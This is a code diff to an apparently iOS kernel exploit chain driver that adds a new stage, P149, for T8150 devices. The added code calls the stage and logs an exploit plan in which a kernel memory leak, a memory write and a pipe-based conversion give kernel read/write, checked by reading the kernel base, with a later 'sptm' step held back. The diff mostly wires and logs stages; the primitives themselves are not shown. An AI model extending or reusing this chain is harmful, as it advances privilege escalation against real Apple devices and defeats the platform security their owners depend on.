@@ -11,6 +11,7 @@
 #import "P139BootIntel.h"
 #import "P044AksKaslrReach.h"
 #import "P114SurfaceLeak.h"
+#import "P149T8150Krw.h"
 #import "P007Board.h"
 #import "P007KreadLane.h"
 #import "ClearSword/CS2Runner.h"
@@ -20,7 +21,7 @@
 #include <string.h>
 #include <unistd.h>
 
-#define KRW_BUILD @"path-test-3"
+#define KRW_BUILD @"t8150-krw-1"
 
 @implementation P007KernelChain
 
@@ -47,7 +48,7 @@
     L([LabDeviceProfile identBlock]);
     L([NSString stringWithFormat:@"[*] sku=%@  hasKread still kread32(kbase)==0xfeedfacf",
        skuName]);
-    L(@"[*] P097 lock/unlock is catalog-solo. P110/P142/P143/P054 stay catalog-solo.");
+    L(@"[*] P097 lock/unlock is catalog-solo. P110/P143/P054 stay catalog-solo. T8150 fires P149.");
     int coreSt = lumina_core_selftest();
     L([NSString stringWithFormat:@"[*] lumina_core %s selftest=%d",
        lumina_core_version(), coreSt]);
@@ -88,13 +89,20 @@
         L([NSString stringWithFormat:@"PATH_TEST id=occ result=%@", ro]);
         L([NSString stringWithFormat:@"PATH_TEST id=conv result=%@", rc]);
     } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
-        L(@"[*] 17 pair: P114 sel-8 serializer (READ-ONLY). 43748 clamp-CLOSED.");
+        L(@"[*] 17 pair: P114 sel-8 serializer (READ-ONLY) then P149 conversion. 43748 clamp-CLOSED.");
         NSString *p114 = nil;
         @try { p114 = [P114SurfaceLeak tap]; }
         @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p114 %@", e.name]); }
         NSString *r114 = [LabPathTest scoreLog:p114 forPath:@"p114"];
         [LabLearn recordPath:@"p114" result:r114 evidence:@"KERNEL P114"];
         L([NSString stringWithFormat:@"PATH_TEST id=p114 class=disclosure result=%@", r114]);
+        L(@"[STEP 3b] P149 17 conversion (Prepare N=8 then 16463, kernel pipes). PANIC-POSSIBLE.");
+        NSString *p149 = nil;
+        @try { p149 = [P149T8150Krw tap]; }
+        @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p149 %@", e.name]); }
+        NSString *r149 = [LabPathTest scoreLog:p149 forPath:@"p149"];
+        [LabLearn recordPath:@"p149" result:r149 evidence:@"KERNEL P149"];
+        L([NSString stringWithFormat:@"PATH_TEST id=p149 class=conversion result=%@", r149]);
     } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
         L(@"[*] 12 mini / A13: 43748 not live. KRW door is CS2 then libkrw.");
         P007Board *bb = [P007Board shared];
@@ -131,8 +139,8 @@
     if (sku == LabSkuA14_23F77) {
         L(@"[*] hunt FORMULA: P044 N=192 occupancy → conversion unnamed → SocketKRW.Arm → kread32. P110/P142 catalog-solo.");
     } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
-        L(@"[*] 17 FORMULA: leak(P114) → race(P110 catalog-solo) → write(P142 catalog-solo) → krw(unnamed) → sptm(HOLD)");
-        L(@"[*] Family-B / P142 panic is write-class, not kread32. AfterKread HOLD.");
+        L(@"[*] 17 FORMULA: leak(P114) → write(P142 prepare-then-overshoot inside P149) → convert(P149 pipes) → kread32(kbase)==0xfeedfacf → sptm(HOLD)");
+        L(@"[*] PIPE-HIT / QUEUE-INIT is a write receipt, not kread32. P110 catalog-solo. AfterKread HOLD.");
     } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
         L(@"[*] 12 mini / A13 FORMULA: CS2/libkrw → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
     }
